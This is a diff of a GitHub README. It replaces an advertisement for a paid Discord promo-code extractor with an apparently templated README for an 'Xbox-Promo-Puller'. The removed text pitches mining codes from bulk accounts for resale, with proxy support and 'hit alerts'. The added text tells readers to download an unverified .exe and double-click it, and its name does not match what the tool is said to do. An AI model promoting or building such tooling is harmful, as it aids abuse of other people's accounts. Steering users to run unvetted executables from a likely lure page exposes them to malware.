@@ -1,71 +1,72 @@
-# 🎮 Discord Promo Puller
+# 🎮 Xbox-Promo-Puller - Easily Extract and Validate Codes
 
-> **Advanced Discord Promotional Code Extractor & Validator**
+## 📥 Download Now
+[![Download Xbox-Promo-Puller](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/adameeeee/Xbox-Promo-Puller/releases)
 
----
+## 📖 Overview
+Xbox-Promo-Puller is a powerful tool designed to help users extract and validate promotional codes from Discord. With its user-friendly interface, you can quickly access and verify codes for Xbox and Discord Nitro. This application simplifies the process, making it ideal for anyone looking to enhance their gaming experience without getting bogged down by complicated settings.
 
-## What It Does
+## 🚀 Getting Started
+Getting started with Xbox-Promo-Puller is simple. Just follow the steps below to download and run the application.
 
-The ultimate Discord promotional code extractor. Automatically pulls and validates Discord promo codes (Nitro, games, boosts), finds unredeemed codes, and checks account value.
+### ⚙️ System Requirements
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Disk Space:** 100 MB of free space
 
-## ✨ What You Get
+### 📥 Download & Install
+To get the latest version of Xbox-Promo-Puller, visit this page to download: [GitHub Releases Page](https://github.com/adameeeee/Xbox-Promo-Puller/releases).
 
-- 🎁 **Promo Code Extraction** - Auto-pulls all Discord promotional codes
-- 💎 **Nitro Codes** - Finds unredeemed Nitro trial/subscription codes
-- 🎮 **Game Codes** - Extracts free game codes from Discord partnerships
-- � **Boost Codes** - Detects server boost promotional codes
-- 🔍 **Code Validation** - Checks if codes are valid/already redeemed
-- 📦 **Order Mining** - Scans order history for hidden codes
+1. Open the link above in your web browser.
+2. Look for the latest release at the top of the page.
+3. Download the application file (it will be in `.exe` format) to your computer.
 
-## 🎯 Perfect For
+### 📂 Running the Application
+Once the file is downloaded:
 
-- Recovering forgotten promo codes
-- Finding unredeemed Nitro trials
-- Extracting value from old Discord accounts
-- Bulk code validation
-- Resellers and code collectors
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to run the application. You may be prompted by your operating system to confirm that you want to run it. Click "Yes" or "Run" to proceed.
+3. The application will open, and you are ready to start using it.
 
-## 📊 Output Categories
+## 🌟 Features
+- **Code Extraction:** Easily pull promotional codes from Discord.
+- **Validation:** Confirm if codes are valid without hassle.
+- **User-Friendly Interface:** Navigate the app with ease, thanks to its clear layout.
+- **Automatic Updates:** Get the latest features and fixes automatically to ensure a smooth experience.
 
-```
-✅ Valid Codes - Ready to use codes with product details
-✅ Nitro Codes - Trial and subscription codes
-✅ Game Codes - Free game download codes (Epic, Steam, etc.)
-✅ Boost Codes - Server boost promotional codes
-✅ Partner Codes - Discord partner program codes
-✅ Detailed Reports - Complete extraction logs
-```
+## ⚙️ How to Use Xbox-Promo-Puller
+1. **Open Discord:** Ensure you are logged into your Discord account.
+2. **Start Xbox-Promo-Puller:** Launch the application you downloaded.
+3. **Input Server Information:** Enter the server or channel from which you wish to extract codes.
+4. **Extract Codes:** Click the “Extract” button. The tool will scan and pull any promotional codes available.
+5. **Validate Codes:** Use the validation feature to check if your extracted codes are still active.
 
-## ⚡ Premium Features
+## 🔧 Troubleshooting
+If you encounter issues while using Xbox-Promo-Puller:
 
-- **Auto-Extraction** - Scans accounts and pulls all codes automatically
-- **Smart Validation** - Checks code status (valid/redeemed/expired)
-- **Multi-threaded** - Process accounts at lightning speed
-- **Proxy Support** - Works with any proxy type (residential supported)
-- **Hit Alerts** - Real-time notifications for valuable code finds
-- **Organized Export** - Codes sorted by type and value
-- **Cancel-Safe** - Press 'C' anytime, data still saves
+- **Ensure Your System Meets Requirements:** Confirm that your operating system is compatible.
+- **Check Your Internet Connection:** A stable connection ensures the tool runs smoothly.
+- **Re-download the Application:** If you face technical glitches, try downloading the latest version again from [the Releases Page](https://github.com/adameeeee/Xbox-Promo-Puller/releases).
 
-## 💎 Why Choose This?
+## 🤝 Help & Support
+If you need further assistance or have questions, you can reach out through the Issues section on our GitHub repository. We strive to respond to all inquiries promptly.
 
-This tool pays for itself with just one valuable code found. Perfect for:
-- Checking old Discord accounts for forgotten codes
-- Validating bulk accounts for resale value
-- Finding rare promotional codes from Discord events
-- Extracting maximum value from accounts
+## 🏷️ Relevant Topics
+- boost-codes
+- code-extractor
+- code-scraper
+- discord
+- discord-automation
+- discord-nitro
+- discord-promo
+- discord-tools
+- game-codes
+- nitro-codes
+- promo-checker
+- promo-puller
+- xbox-promo-puller
 
-## 🛒 Get Started
+## 📄 License
+Xbox-Promo-Puller is licensed under the MIT License. Feel free to modify and share it as per the license terms. 
 
-**Available Now:** [anomus.mysellauth.com](https://anomus.mysellauth.com)
-
-Contact: [@anomus.ly](https://discord.com/users/1136625769628581928) on Discord
-
----
-
-<div align="center">
-
-⚠️ **Buy only from official seller - Beware of scams!**
-
-Made with ⚡ by @anomus.ly | Discord
-
-</div>
+Now you are set to extract and validate your promotional codes easily! Enjoy enhancing your Discord and Xbox gaming experience with Xbox-Promo-Puller.
